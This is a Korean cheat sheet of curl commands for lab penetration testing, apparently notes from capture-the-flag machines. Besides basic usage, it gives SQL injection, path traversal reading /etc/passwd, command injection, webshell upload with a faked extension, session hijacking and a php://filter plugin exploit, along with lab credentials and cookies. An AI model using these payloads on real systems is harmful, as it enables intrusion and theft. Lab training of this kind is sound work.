# curl - HTTP 요청 도구

## 기본 요청

```bash
curl http://target.com                # 기본 GET 요청 (출력: 터미널)
curl -o file.html http://target.com   # 파일로 저장
curl -s http://target.com             # 진행 바 숨김
curl -L http://target.com             # 리다이렉트 따라가기
```

## 디버깅/분석

```bash
curl -v http://target.com             # 모든 요청/응답 상세 표시 (필수)
curl -I http://target.com             # 헤더만 요청 (HEAD 메소드)
curl -i http://target.com             # 응답 본문과 헤더 함께 표시

# 리디렉션으로 파일 저장 후 base64 디코딩
curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
base64 -d hello.b64 > hello.php
```

## 인증

```bash
curl -u user:pass http://target.com   # 기본 인증
curl -H "Authorization: Bearer eyJh..." http://target.com  # JWT/토큰

# 쿠키 관련
curl -c cookie.txt http://target.com        # 쿠키 저장
curl -b cookie.txt http://target.com        # 저장된 쿠키 사용
curl -b cookie.txt -c cookie.txt http://target.com  # 세션 유지

# cookie example (total 2)
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070

# request with cookie
curl -i -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/
```

## 데이터 전송

```bash
# POST form
# -d === --data
curl -X POST -d "user=admin&pass=secret" http://target.com/login.php

# login
curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt


# 파일 업로드
curl -F "file=@shell.php" -F "description=profile" http://target.com/upload.php

# JSON 전송
curl -X POST -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"s3cr3t"}' \
    http://target.com/api/login
```

## 헤더 조작

```bash
# 사용자 에이전트 변경
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://target.com

# IP 스푸핑 시도
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
curl -H "X-Real-IP: 127.0.0.1" http://target.com
```

## 보안/프록시

```bash
curl -k https://target.com                       # SSL 인증서 검증 무시
curl -x http://127.0.0.1:8080 http://target.com  # HTTP 프록시 (Burp)
curl --socks5 127.0.0.1:9050 http://target.com   # SOCKS5 프록시 (Tor)
```

## 취약점 테스트

```bash
# SQL 인젝션
curl "http://target.com/search.php?id=1 OR 1=1--"

# LFI
curl "http://target.com/page.php?file=../../../etc/passwd"

# 명령어 인젝션
curl "http://target.com/ping.php?host=127.0.0.1;id"
```

# 파일 업로드 취약점 (확장자 우회)

curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
curl -F "file=@/경로/파일명" http://타겟IP/upload.php
`@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.

````

### 인증 우회 및 세션 작업

```bash
# CSRF 토큰 추출 후 사용
TOKEN=$(curl -s -c cookie.txt http://target.com/form | grep -o 'csrf_token" value="[^"]*' | cut -d'"' -f3)
curl -b cookie.txt -d "csrf_token=$TOKEN&username=admin&password=password" http://target.com/login

# 쿠키 조작으로 세션 하이재킹
curl -b "sessionid=STOLEN_SESSION_VALUE" http://target.com/admin

# HTTP 기본 인증 테스트
curl -u admin:password http://target.com/admin
````

### 유용한 도구 조합

```bash
# URL 인코딩 (Python 활용)
curl "http://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))")"

# Base64 인코딩 헤더 사용 (Basic Auth)
curl -H "Authorization: Basic $(echo -n 'admin:password' | base64)" http://target.com

# 404 오류 페이지 숨기기
curl -f http://target.com/admin || echo "페이지 없음"

# 응답에서 특정 정보 필터링
curl -s http://target.com | grep "flag"
```

### 실전 로그인 및 세션 유지 예시

```bash
# 로그인하여 세션 쿠키 저장
curl -c cookie.txt -X POST http://lookup.thm/login.php -d 'username=admin&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

# 저장된 쿠키로 인증된 페이지 접근
curl -b cookie.txt http://lookup.thm/dashboard.php

#파일 다운로드
wget http://www.smol.thm:8080/wordpress.old.zip
# wget 없을 때 파일 다운로드
curl -O http://smol.thm:8080/wordpress.old.zip
```

# 로그인 쿠키 저장

curl -c cookie.txt -X POST http://grafana.planning.htb/login -H "Content-Type: application/json" -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'

┌──(root㉿docker-desktop)-[/]
└─# curl -c cookie.txt -X POST http://grafana.planning.htb/login \
 -H "Content-Type: application/json" \
 -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'

# Cookie File -> Netscape format 분석

grafana.planning.htb FALSE / FALSE 1755096838 grafana_session_expiry 1752505433
#HttpOnly_grafana.planning.htb FALSE / FALSE 1755096838 grafana_session 508ccc52bfc97942574a1cb84a726eb1

| 항목      | 설명                                                           |
| --------- | -------------------------------------------------------------- |
| 도메인    | `grafana.planning.htb` – 쿠키가 유효한 호스트                  |
| `FALSE`   | 이 쿠키가 서브도메인에 적용되는지 여부 (FALSE = 해당 도메인만) |
| 경로      | `/` – 쿠키가 유효한 경로                                       |
| Secure    | `FALSE` – HTTPS에서만 전송되는지 여부                          |
| 만료 시간 | `1755096838` (Unix timestamp) – 쿠키 만료 시각                 |
| 이름      | `grafana_session_expiry` 또는 `grafana_session`                |
| 값        | 예: `508ccc52bfc97942574a1cb84a726eb1`                         |
